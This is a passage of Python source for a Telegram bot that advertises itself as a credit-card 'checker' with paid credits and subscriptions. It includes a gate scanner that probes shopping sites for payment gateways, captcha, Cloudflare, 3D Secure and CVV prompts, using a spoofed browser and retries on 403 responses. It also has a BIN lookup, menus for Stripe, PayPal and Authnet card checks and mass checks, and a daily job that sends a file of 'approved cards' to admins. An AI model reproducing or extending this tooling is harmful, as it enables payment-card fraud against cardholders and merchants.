        def detect_3d_secure(response_text):
            keywords = [
                "3d secure", "3ds", "3-d secure", "threeds", "acs",
                "authentication required", "secure authentication",
                "secure code", "otp verification", "verified by visa",
                "mastercard securecode", "3dsecure"
            ]
            for keyword in keywords:
                if keyword in response_text.lower():
                    return "3D (3D Secure Enabled)"
            return "2D (No 3D Secure Found)"

        url = normalize_url(url)
        if not is_valid_url(url):
            return {
                "error": "Invalid URL",
                "status": "failed",
                "status_code": 400
            }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
            'Referer': 'https://www.google.com'
        }

        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 403:
            for attempt in range(3):
                time.sleep(2 ** attempt)
                response = requests.get(url, headers=headers, timeout=10)
                if response.status_code != 403:
                    break

        if response.status_code == 403:
            return {
                "error": "403 Forbidden: Access Denied",
                "status": "failed",
                "status_code": 403
            }

        response.raise_for_status()
        detected_gateways = find_payment_gateways(response.text)
        captcha_type = check_captcha(response.text)
        cloudflare_status = detect_cloudflare(response)
        secure_type = detect_3d_secure(response.text)
        cvv_present = "cvv" in response.text.lower() or "cvc" in response.text.lower()
        system = "WooCommerce" if "woocommerce" in response.text.lower() else (
                 "Shopify" if "shopify" in response.text.lower() else "Not Detected")

        return {
            "url": url,
            "status": "success",
            "status_code": response.status_code,
            "payment_gateways": detected_gateways or ["None Detected"],
            "captcha": captcha_type,
            "cloudflare": cloudflare_status,
            "security": secure_type,
            "cvv_cvc_status": "Requested" if cvv_present else "Unknown",
            "inbuilt_system": system
        }

    except requests.exceptions.HTTPError as http_err:
        return {
            "error": f"HTTP Error: {str(http_err)}",
            "status": "failed",
            "status_code": 500
        }
    except requests.exceptions.RequestException as req_err:
        return {
            "error": f"Request Error: {str(req_err)}",
            "status": "failed",
            "status_code": 500
        }
    except Exception as e:
        return {
            "error": f"Unexpected error: {str(e)}",
            "status": "failed",
            "status_code": 500
        }

def format_gate_result(result, mention, user_status, time_taken):
    if result.get('status') == 'failed':
        return f"""
┏━━━━━━━⍟</a>
┃ 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 ❌</a>
┗━━━━━━━━━━━⊛</a>
[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <code>{result.get('error', 'Unknown error')}</code>
[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐝𝐞 ➳ <i>{result.get('status_code', 'N/A')}</i>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
[⸙]</a> 𝐃𝐞𝐯 ⌁ xX_Naman_Xx
[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

    payment_gateways = ", ".join(result.get('payment_gateways', []))
    captcha_types = ", ".join(result.get('captcha', []))

    return f"""
┏━━━━━━━⍟</a>
┃ 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 ✅</a>
┗━━━━━━━━━━━⊛</a>
[⸙]</a> 𝐒𝐢𝐭𝐞 ➳ <code>{result.get('url', 'N/A')}</code>
[⸙]</a> 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➳ <i>{payment_gateways}</i>
[⸙]</a> 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➳ <i>{captcha_types}</i>
[⸙]</a> 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➳ <i>{result.get('cloudflare', 'Unknown')}</i>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➳ <i>{result.get('security', 'Unknown')}</i>
[⸙]</a> 𝐂𝐕𝐕/𝐂𝐕𝐂 ➳ <i>{result.get('cvv_cvc_status', 'Unknown')}</i>
[⸙]</a> 𝐈𝐧𝐛𝐮𝐢𝐥𝐭 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <i>{result.get('inbuilt_system', 'Unknown')}</i>
[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <i>{result.get('status_code', 'N/A')}</i>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
[⸙]</a> 𝐃𝐞𝐯 ⌁ https://t.me/xX_Naman_Xx
[⸙]</a> 𝗧𝗢𝗧𝗔𝗟 𝗧𝗜𝗠𝗘 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

@bot.message_handler(commands=['gate'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.gate'))
def handle_gate(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide a URL to check. Example: /gate https://example.com")
        return

    url = command_parts[1]
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

    processing_msg = f"🔍 Checking URL: {url}</a>"
    status_message = bot.reply_to(message, processing_msg, parse_mode='HTML')

    start_time = time.time()
    result = check_gate_url(url)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = format_gate_result(result, mention, user_status, time_taken)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

def format_bin_result(bin_info, bin_number, mention, user_status, time_taken):
    if not bin_info:
        return f"""
┏━━━━━━━⍟</a>
┃ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ❌</a>
┗━━━━━━━━━━━⊛</a>
[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <code>No information found for BIN: {bin_number}</code>
──────── ⸙ ─────────</a>
[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
[⸙]</a> 𝐃𝐞𝐯 ⌁ xX_Naman_Xx
[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

    bank = bin_info.get('bank', 'None')
    brand = bin_info.get('brand', 'None')
    card_type = bin_info.get('type', 'None')
    country = bin_info.get('country', 'None')
    country_flag = bin_info.get('country_flag', '')
    level = bin_info.get('level', 'None')

    return f"""
┏━━━━━━━⍟</a>
┃ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</a>
┗━━━━━━━━━━━⊛</a>
[⸙]</a> 𝐁𝐈𝐍 ➳ <code>{bin_number}</code>
[⸙]</a> 𝐁𝐚𝐧𝐤 ➳ {bank}
[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ➳ {brand}
──────── ⸙ ─────────</a>
[⸙]</a> 𝐓𝐲𝐩𝐞 ➳ {card_type}
[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country} {country_flag}
[⸙]</a> 𝐋𝐞𝐯𝐞𝐥 ➳ {level}
──────── ⸙ ─────────</a>
[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
[⸙]</a> 𝐃𝐞𝐯 ⌁ xX_Naman_Xx
[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

@bot.message_handler(commands=['bin'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.bin'))
def handle_bin(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide a BIN number. Example: /bin 524534 or .bin 52453444|02|2026")
        return

    input_text = command_parts[1]
    bin_number = ""
    for char in input_text:
        if char.isdigit():
            bin_number += char
            if len(bin_number) >= 8:
                break
        elif char == '|':
            break

    if len(bin_number) < 6:
        bot.reply_to(message, "Please provide a valid BIN with at least 6 digits. Example: /bin 524534 or .bin 52453444|02|2026")
        return

    bin_number = bin_number[:8]
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

    processing_msg = f"<a href='https://t.me/xX_Naman_Xx'>🔍 Checking BIN: {bin_number}</a>"
    status_message = bot.reply_to(message, processing_msg, parse_mode='HTML')

    start_time = time.time()
    bin_info = get_bin_info(bin_number) or {}
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = format_bin_result(bin_info, bin_number, mention, user_status, time_taken)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

import html

@bot.message_handler(commands=['start'])
def handle_start(message):
    if not hasattr(bot, "user_data"):
        bot.user_data = {}

    last = bot.user_data.get(message.chat.id, {})
    if last.get("last_update_id") == message.message_id:
        return
    bot.user_data[message.chat.id] = {"last_update_id": message.message_id}

    save_users(message.from_user.id)

    user = message.from_user
    mention = f"<a href='tg://user?id={user.id}'>{html.escape(user.first_name)}</a>"
    username = f"@{html.escape(user.username)}" if user.username else "None"
    join_date_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(message.date))
    credits = "0"

    caption = f"""
↯ ᴡᴇʟᴄᴏᴍᴇ

⸙ ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
⸙ ᴊᴏɪɴ ᴅᴀᴛᴇ ⌁ {join_date_formatted}
⸙ ᴄʜᴀᴛ ɪᴅ ⌁ <code>{user.id}</code>
⸙ ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
⸙ ᴄʀᴇᴅɪᴛs ⌁ {credits}

↯ ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ
"""

    # Remove unnecessary HTML escapes that cause parsing errors
    clean_caption = caption.strip()

    markup = telebot.types.InlineKeyboardMarkup()
    btn1 = telebot.types.InlineKeyboardButton("🔍 Gateways", callback_data="gateways")
    btn2 = telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")
    btn3 = telebot.types.InlineKeyboardButton("❓ Help", callback_data="help")
    btn4 = telebot.types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")
    btn5 = telebot.types.InlineKeyboardButton("📢 Channel", url="https://t.me/backyXchannel")
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5)

    try:
        msg = bot.send_video(
            chat_id=message.chat.id,
            video="https://t.me/backyXchannel/48",
            caption=clean_caption,
            parse_mode="HTML",
            reply_markup=markup
        )
    except Exception as e:
        print(f"Video send failed: {e}")
        try:
            msg = bot.send_document(
                chat_id=message.chat.id,
                document="https://t.me/backyXchannel/48",
                caption=clean_caption,
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Document send failed: {e}")
            try:
                msg = bot.send_photo(
                    chat_id=message.chat.id,
                    photo="https://t.me/backyXchannel/48",
                    caption=clean_caption,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            except Exception as e:
                print(f"Photo send failed: {e}")
                msg = bot.send_message(
                    chat_id=message.chat.id,
                    text=clean_caption + "\n\n🎥 Video preview unavailable",
                    parse_mode="HTML",
                    reply_markup=markup,
                    disable_web_page_preview=True
                )

    bot.user_data[message.chat.id]["welcome_msg_id"] = msg.message_id


import html

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user = call.from_user
    mention = f"<a href='tg://user?id={user.id}'>{html.escape(user.first_name)}</a>"
    username = f"@{html.escape(user.username)}" if user.username else "None"
    credits = "0"

    def safe_caption(text):
        return text.strip()

    if call.data == "gateways":
        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main"))

        gateways_text = f"""
🔍 <b>Gateways Available:</b>

⸙ <code>.chk</code> - Stripe Auth 
⸙ <code>.vbv</code> - 3DS Lookup
⸙ <code>.py</code> - Paypal [0.1$]
⸙ <code>.qq</code> - Stripe Square [0.20$]
⸙ <code>.cc</code> - Site Based [1$]
⸙ <code>.sh</code> - Self Shopify [Custom]

📊 <b>Mass Check Commands:</b>
<code>.mchk</code> <code>.mvbv</code> <code>.mpy</code> 
<code>.mqq</code> <code>.mcc</code> <code>.msh</code>
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=safe_caption(gateways_text),
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing gateways: {e}")
        bot.answer_callback_query(call.id, "Gateways information displayed")

    elif call.data == "tools":
        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main"))

        tools_text = f"""
🛠️ <b>Available Tools:</b>

⸙ <code>.gate</code> URL - Gate Checker
• Check payment gateways, captcha, and security

⸙ <code>.bin</code> BIN - BIN Lookup  
• Get detailed BIN information

⸙ <code>.au</code> - Stripe Auth 2
⸙ <code>.at</code> - Authnet [5$]
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=safe_caption(tools_text),
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing tools: {e}")
        bot.answer_callback_query(call.id, "Tools information displayed")

    elif call.data == "help":
        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main"))

        help_text = f"""
❓ <b>Help & Support</b>

⸙ <b>How to use:</b>
• Use commands like <code>.chk CC|MM|YY|CVV</code>
• For mass check, reply to message with cards using <code>.mchk</code>
• Set Shopify site with <code>/seturl your-store.com</code>

⸙ <b>Support:</b>
• Channel: @backyXchannel
• Contact for help and credits

⸙ <b>Note:</b>
• Always use valid card formats
• Results may vary by gateway
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=safe_caption(help_text),
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing help: {e}")
        bot.answer_callback_query(call.id, "Help information displayed")

    elif call.data == "myinfo":
        markup = telebot.types.InlineKeyboardMarkup()
        markup.row(telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main"))

        myinfo_text = f"""
👤 <b>Your Information:</b>

⸙ ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
⸙ ᴜsᴇʀ ɪᴅ ⌁ <code>{user.id}</code>
⸙ ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
⸙ ᴄʀᴇᴅɪᴛs ⌁ {credits}

📊 <b>Usage Statistics:</b>
⸙ ᴛᴏᴛᴀʟ ᴄʜᴇᴄᴋs ⌁ 0
⸙ ᴀᴘᴘʀᴏᴠᴇᴅ ⌁ 0
⸙ ᴅᴇᴄʟɪɴᴇᴅ ⌁ 0
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=safe_caption(myinfo_text),
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing myinfo: {e}")
        bot.answer_callback_query(call.id, "Your information displayed")

    elif call.data == "back_to_main":
        markup = telebot.types.InlineKeyboardMarkup()
        btn1 = telebot.types.InlineKeyboardButton("🔍 Gateways", callback_data="gateways")
        btn2 = telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")
        btn3 = telebot.types.InlineKeyboardButton("❓ Help", callback_data="help")
        btn4 = telebot.types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")
        btn5 = telebot.types.InlineKeyboardButton("📢 Channel", url="https://t.me/backyXchannel")
        markup.row(btn1, btn2)
        markup.row(btn3, btn4)
        markup.row(btn5)

        main_text = f"""
↯ ᴡᴇʟᴄᴏᴍᴇ

⸙ ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
⸙ ᴊᴏɪɴ ᴅᴀᴛᴇ ⌁ {time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(call.message.date))}
⸙ ᴄʜᴀᴛ ɪᴅ ⌁ <code>{user.id}</code>
⸙ ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
⸙ ᴄʀᴇᴅɪᴛs ⌁ {credits}

↯ ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=safe_caption(main_text),
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing back to main: {e}")
        bot.answer_callback_query(call.id, "Returned to main menu")



        # Track bot start time
start_time = time.time()

# Load users from file or list (modify based on your bot setup)
def get_total_users():
    try:
        with open("users.txt", "r") as f:
            return len(set(f.readlines()))
    except:
        return 0
@bot.message_handler(commands=['ping'])
def handle_ping(message):
    ping_start = time.time()
    msg = bot.send_message(message.chat.id, "⚡ Checking status...")
    ping_time = int((time.time() - ping_start) * 1000)

    # Uptime
    uptime_seconds = int(time.time() - start_time)
    uptime = str(timedelta(seconds=uptime_seconds))

    # System info
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    system_info = platform.system() + " (" + platform.machine() + ")"
    total_users = get_total_users()

    # Stylish status message
    status = f"""<b> ✦ 𝑽𝒐𝒊𝒅 𝑿 𝑪𝒉𝒆𝒄𝒌𝒆𝒓 ✦ is running...</b>

✧ <b>Ping:</b> <code>{ping_time} ms</code>
✧ <b>Up Time:</b>  <code>{uptime}</code>
✧ <b>CPU Usage:</b> <code>{cpu_usage}%</code>
✧ <b>RAM Usage:</b> <code>{ram_usage}%</code>
✧ <b>System:</b> <code>{system_info}</code>
✧ <b>Total Users:</b> <code>{total_users}</code>

✧ <b>Bot By:</b> <a href='https://t.me/xX_Naman_Xx336'>𝐃𝐞𝐯</a>
"""
    bot.edit_message_text(status, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML", disable_web_page_preview=True)

def generate_redeem_code():
    """Generate a random 10-digit redeem code starting with Dark-"""
    prefix = "Void-"
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=20))
    return prefix + suffix

def handle_generate(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /generate number or .generate number")
            return
            
        try:
            num_keys = int(parts[1])
            if num_keys <= 0:
                bot.reply_to(message, "❌ Number of keys must be at least 1")
                return
            elif num_keys > 100:
                num_keys = 100
                bot.reply_to(message, "⚠️ Maximum 100 keys at a time. Generating 100 keys.")
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number")
            return
            
        # Generate keys
        keys = []
        for _ in range(num_keys):
            key = generate_redeem_code()
            keys.append(key)
            
            # Store key with expiry (5 days from now)
            expiry_date = datetime.now() + timedelta(days=5)
            REDEEM_CODES[key] = {
                'value': 20,
                'expiry': expiry_date.strftime("%Y-%m-%d"),
                'used': False,
                'used_by': None,
                'used_date': None
            }
        
        # Save to Firebase
        write_firebase("redeem_codes", REDEEM_CODES)
            
        # Format the keys for display
        codes_list = "\n".join([f"<code>{key}</code>" for key in keys])
        response = f"""
<b>✅ Successfully Generated {num_keys} Redeem Codes!</b>

<code>{codes_list}</code>

<b>These codes are being broadcast to all users and groups...</b>
"""
        bot.reply_to(message, response, parse_mode='HTML')
        
        # Broadcast keys to all users and groups in background
        threading.Thread(target=broadcast_redeem_codes, args=(keys,)).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def send_hits_to_admins():
    try:
        if os.path.exists('HITS.txt') and os.path.getsize('HITS.txt') > 0:
            for admin_id in ADMIN_IDS:
                with open('HITS.txt', 'rb') as f:
                    bot.send_document(admin_id, f, caption="✅ Daily Approved Cards (HITS) 📂")
    except Exception as e:
        print(f"Error sending HITS.txt: {str(e)}")

def schedule_daily_hits():
    schedule.every().day.at("05:00").do(send_hits_to_admins)  # 5:00 UTC = 8:00 KSA
    while True:
        schedule.run_pending()
        time.sleep(60)

# Handle both /grant and .grant
@bot.message_handler(commands=['grant'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.grant'))
def grant_access(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        chat_id = message.text.split()[1]

        # Add to local set
        APPROVED_GROUPS.add(chat_id)

        # Save to Firebase
        write_firebase("approved_groups", list(APPROVED_GROUPS))

        # Optionally still save to local file (for backup or offline use)
        with open('approved_groups.txt', 'a') as f:
            f.write(f"{chat_id}\n")

        bot.reply_to(message, f"✅ Group {chat_id} has been added to the approved list.")

    except Exception as e:
        bot.reply_to(message, "❌ Invalid format. Use /grant chat_id or .grant chat_id")

@bot.message_handler(commands=['unsub'])
def handle_unsub(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /unsub USER_ID")
            return
            
        user_id = parts[1]
        
        if user_id in SUBSCRIBED_USERS:
            del SUBSCRIBED_USERS[user_id]
            # Save to Firebase
            write_firebase("subscribed_users", SUBSCRIBED_USERS)
            bot.reply_to(message, f"✅ User {user_id} unsubscribed successfully!")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not subscribed.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['ungrant'])
def handle_ungrant(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /ungrant GROUP_ID")
            return

        group_id = parts[1]

        if group_id in APPROVED_GROUPS:
            APPROVED_GROUPS.remove(group_id)

            # Update Firebase
            write_firebase("approved_groups", list(APPROVED_GROUPS))

            # Optional: update local file (clear and rewrite all)
            with open('approved_groups.txt', 'w') as f:
                for gid in APPROVED_GROUPS:
                    f.write(f"{gid}\n")

            bot.reply_to(message, f"✅ Group {group_id} removed from approved list!")
        else:
            bot.reply_to(message, f"❌ Group {group_id} is not in the approved list.")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['res'])
def handle_res(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Format: /res USER_ID TIME\nExample: /res 123456 1d (1 day)\nOr: /res 123456 2h (2 hours)\nOr: /res 123456 30m (30 minutes)")
            return
            
        user_id = parts[1]
        time_str = parts[2].lower()
        
        # Calculate seconds based on input
        if time_str.endswith('d'):  # days
            seconds = int(time_str[:-1]) * 86400
            time_text = f"{time_str[:-1]} day(s)"
        elif time_str.endswith('h'):  # hours
            seconds = int(time_str[:-1]) * 3600
            time_text = f"{time_str[:-1]} hour(s)"
        elif time_str.endswith('m'):  # minutes
            seconds = int(time_str[:-1]) * 60
            time_text = f"{time_str[:-1]} minute(s)"
        else:
            bot.reply_to(message, "❌ Invalid time format. Use d=days, h=hours, m=minutes")
            return
            
        expiry_time = time.time() + seconds
        BANNED_USERS[user_id] = expiry_time
        
        # Save to file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)
            
        bot.reply_to(message, f"✅ User {user_id} restricted for {time_text}!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unres'])
def handle_unres(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /unres USER_ID")
            return
            
        user_id = parts[1]
        
        if user_id in BANNED_USERS:
            del BANNED_USERS[user_id]
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
            bot.reply_to(message, f"✅ User {user_id} unrestricted successfully!")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not restricted.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /addcr and .addcr
@bot.message_handler(commands=['addcr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.addcr'))
def handle_add_credits(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use /addcr user_id credits or .addcr user_id credits")
            return

        user_id = parts[1]
        try:
            credits = int(parts[2])
            if credits <= 0:
                bot.reply_to(message, "❌ Credits must be a positive number")
                return
        except ValueError:
            bot.reply_to(message, "❌ Credits must be a number")
            return

        # Load existing user credits from Firebase
        USER_CREDITS = read_firebase("user_credits")

        # Initialize user if not exists
        if user_id not in USER_CREDITS:
            USER_CREDITS[user_id] = {
                'date': str(datetime.now().date()),
                'credits': 0
            }

        # Add credits
        USER_CREDITS[user_id]['credits'] += credits

        # Save back to Firebase
        write_firebase("user_credits", USER_CREDITS)

        bot.reply_to(message, f"✅ Added {credits} credits to user {user_id}. Total credits now: {USER_CREDITS[user_id]['credits']}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /subs and .subs
@bot.message_handler(commands=['subs'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.subs'))
def handle_subscription(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use /subs user_id plan (1=7d, 2=15d, 3=30d)")
            return
            
        user_id = parts[1]
        plan = int(parts[2])
        
        if plan not in [1, 2, 3,]:
            bot.reply_to(message, "❌ Invalid plan. Use 1=7d, 2=15d, 3=30d")
            return
            
        # Calculate expiry date
        if plan == 1:
            days = 7
        elif plan == 2:
            days = 15
        else:
            days = 30
            
        
            
        expiry_date = datetime.now() + timedelta(days=days)
        expiry_str = expiry_date.strftime("%Y-%m-%d")
        
        # Add to subscribed users in Firebase
        SUBSCRIBED_USERS[user_id] = {
            'plan': plan,
            'expiry': expiry_str
        }
        
        # Save to Firebase
        write_firebase("subscribed_users", SUBSCRIBED_USERS)
            
        bot.reply_to(message, f"✅ User {user_id} subscribed to plan {plan} (expires {expiry_str})")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def download_and_send_video(message, url, msg_id, tag):
    chat_id = message.chat.id

    try:
        send_progress_animation(bot, chat_id, msg_id)

        # Options for yt-dlp
        ydl_opts = {
            'format': 'mp4',
            'outtmpl': f"{tag}_%(title).50s.%(ext)s",
            'quiet': True,
        }

        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            filename = ydl.prepare_filename(info)

        title = info.get('title', 'Downloaded Video')

        bot.send_chat_action(chat_id, 'upload_video')
        with open(filename, 'rb') as video:
            bot.send_video(chat_id, video, caption=f"🎬 <b>{title}</b>", parse_mode='HTML')

        os.remove(filename)
        bot.delete_message(chat_id, msg_id)

    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ Error: {str(e)}")

def send_progress_animation(bot, chat_id, message_id):
    progress_stages = [
        "Downloading video, please wait.\n[░░░░░░░░░░]",
        "Downloading video, please wait.\n[▓░░░░░░░░░]",
        "Downloading video, please wait.\n[▓▓░░░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓░░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓░░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓░░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓░░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓░░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓░░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓▓░]",
        "Downloading video, please wait.\n[▓▓▓▓▓▓▓▓▓▓]"
    ]
    for stage in progress_stages:
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=stage)
            time.sleep(0.4)
        except:
            break


@bot.message_handler(commands=['yt'])
def handle_youtube_download(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DM. Use it in an approved group or subscribe to unlock.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Usage: /yt <YouTube video URL>")
        return

    link = message.text.split()[1]
    msg = bot.reply_to(message, "Downloading video, please wait.\n[░░░░░░░░░░]")
    threading.Thread(target=download_and_send_video, args=(message, link, msg.message_id, "yt")).start()

@bot.message_handler(commands=['ins'])
def handle_instagram_download(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DM. Use it in an approved group or subscribe to unlock.")
        return
